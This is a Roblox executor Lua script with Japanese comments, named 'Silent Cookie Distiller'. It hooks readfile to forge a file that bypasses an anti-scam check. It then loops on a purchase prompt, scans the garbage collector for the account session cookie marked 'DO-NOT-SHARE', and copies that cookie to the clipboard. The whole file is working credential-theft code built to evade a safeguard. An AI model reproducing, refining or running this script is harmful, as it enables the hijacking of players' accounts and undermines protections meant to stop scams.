-- [[ Project: Silent Cookie Distiller - Lightweight ]]
print("[DEBUG] System Booting...")

local player = game:GetService("Players").LocalPlayer
-- clonerefを使わず、直接呼び出しでフリーズを回避
local MS = game:GetService("MarketplaceService")

-- 1. セキュリティ偽装 (hookのみ)
pcall(function()
    local old_read
    old_read = hookfunction(readfile, function(path)
        if string.find(path:lower(), "disableantiscam") then
            return '{"WARNING":"BYPASS","allowed_games":"*","user_id":"'..tostring(player.UserId)..'","version_num":707}'
        end
        return old_read(path)
    end)
    print("[DEBUG] Hook Set")
end)

-- 2. 抽出関数（必要な時だけ呼ぶ）
local function fast_capture()
    print("[DEBUG] Quick Scanning...")
    local prefix = "_|WARNING:-DO-NOT-SHARE-"
    -- getgc(true) ではなく、通常の getgc() で文字列だけを狙う
    for _, v in pairs(getgc()) do
        if type(v) == "string" and string.find(v, prefix, 1, true) then
            local _, pos = string.find(v, "|_", 1, true)
            if pos then
                setclipboard(string.sub(v, pos + 1))
                print("--------------------------------")
                print("SUCCESS: Captured to clipboard!")
                print("--------------------------------")
                return true
            end
        end
    end
    print("[DEBUG] Not found yet. Try opening the UI again.")
    return false
end

-- 3. トリガー（5秒おきにUIを表示し、その直後にスキャン）
task.spawn(function()
    while true do
        print("[DEBUG] Triggering UI...")
        pcall(function()
            -- 軽いプロンプト（ID 0）を使用
            MS:PromptProductPurchase(player, 0)
        end)
        
        -- UIが開くのを少し待ってからスキャンを実行
        task.wait(2)
        if fast_capture() then break end
        
        task.wait(8) -- 10秒に1回の間隔でリトライ（フリーズ防止）
    end
end)
